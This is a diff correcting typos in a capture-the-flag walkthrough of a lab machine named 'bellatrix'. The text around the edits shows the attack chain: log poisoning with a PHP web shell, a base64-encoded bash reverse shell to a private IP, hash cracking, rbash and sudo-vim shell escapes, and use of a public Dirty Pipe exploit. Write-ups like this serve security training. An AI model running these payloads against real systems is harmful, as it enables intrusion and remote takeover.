@@ -33,7 +33,7 @@ Thats right by going to the php domain and adding ?file we can read files from t
 ssh '<?php system($_GET[c]); ?>'@192.168.1.40
 ```
 
-Just enter whatever password you wish because the idea of this is injecting code on the log. Now if we also call the atribute c we can execute commands ex: ` http://192.168.1.40/ikilledsiriusblack.php?file=/var/log/auth.log&c=ls ` by pressing crtl+u we can see the response more clearly (at least in chrome). Ok let's just inject the base64 shell then in my case `echo "c2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4xLjEzLzc3NzcgMD4mMQo=" | base64 -d | bash`
+Just enter whatever password you wish because the idea of this is injecting code on the log. Now if we also call the attribute c we can execute commands ex: ` http://192.168.1.40/ikilledsiriusblack.php?file=/var/log/auth.log&c=ls ` by pressing crtl+u we can see the response more clearly (at least in chrome). Ok let's just inject the base64 shell then in my case `echo "c2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4xLjEzLzc3NzcgMD4mMQo=" | base64 -d | bash`
 
 ```shell
  nc -lvp 7777
@@ -49,7 +49,7 @@ www-data@bellatrix:/var/www/html$ stty rows 30 columns 132
 www-data@bellatrix:/var/www/html$
 ```
 
-We have a directoty called secrets in base64 and inside we have the password hash of the user lestrange and a dictionary.
+We have a directory called secrets in base64 and inside we have the password hash of the user lestrange and a dictionary.
 
 ```shell
 secretswww-data@bellatrix:/var/www/html$ cd c2VjcmV0cw\=\=/
@@ -69,7 +69,7 @@ hashcat -m 1800 hash dict --show
 $6$1eIjsdebFF9/rsXH$NajEfDYUP7p/sqHdyOIFwNnltiRPwIU0L14a8zyQIdRUlAomDNrnRjTPN5Y/WirDnwMn698kIA5CV8NLdyGiY0:ihateharrypotter
 ```
 
-Once loged as the new user we have a restricted shell called rbash but we can easily break out like this
+Once logged as the new user we have a restricted shell called rbash but we can easily break out like this
 
 ```shell
 lestrange@bellatrix:/var/www/html/c2VjcmV0cw==$ cd
@@ -99,7 +99,7 @@ sudo -u bellatrix vim -c ':!/bin/sh'
 $ bash
 bellatrix@bellatrix:/var/www/html$
 ```
- When executing the command a weird psedo shell spawns but by typing bash we can once again break out. Now we can get the user flag
+ When executing the command a weird pseudo shell spawns but by typing bash we can once again break out. Now we can get the user flag
 
 ```shell
 bellatrix@bellatrix:/var/www/html$ cd
@@ -108,7 +108,7 @@ bellatrix@bellatrix:~$ cat flag.txt
 
 ## Root flag
 
-For a better workflow I created an ssh key pair and added my public key to the authorized keys however this is optional. After some time lost I decided to execute linpeas and I realize that the user is part of the lxd group however lxc wasn't installed. So my next idea is to try the dirty pipe exploit, I used this [repo](https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits) modified the compile.sh to add --static to both lines and tried the exploits, exploit-1 dind't work but exploit-2 did.
+For a better workflow I created an ssh key pair and added my public key to the authorized keys however this is optional. After some time lost I decided to execute linpeas and I realize that the user is part of the lxd group however lxc wasn't installed. So my next idea is to try the dirty pipe exploit, I used this [repo](https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits) modified the compile.sh to add --static to both lines and tried the exploits, exploit-1 didn't work but exploit-2 did.
 
 
 ```shell
@@ -142,6 +142,6 @@ root
 
 ```
 
-For me this machine very easy as the Dobby one it only adds more steps but none are difficult to achieve, however I reckon that this machine is really usefull to practise a lot of skills.
+For me this machine is very easy as the Dobby one it only adds more steps but none are difficult to achieve, however I reckon that this machine is really useful to practice a lot of skills.
 
-(EDIT): Hey the last step wasn't needed for root flag, as the machine was in spanish I though that when I executed sudo -l it meant you could execute this command as bellatrix but bellatrix is also the name of the machine. So you can just go from lestrange to root without dirty pipe. And that's why sometimes you have to read carefully! Anyway great machine over all.
+(EDIT): Hey the last step wasn't needed for root flag, as the machine was in Spanish I though that when I executed sudo -l it meant you could execute this command as bellatrix but bellatrix is also the name of the machine. So you can just go from lestrange to root without dirty pipe. And that's why sometimes you have to read carefully! Anyway great machine over all.
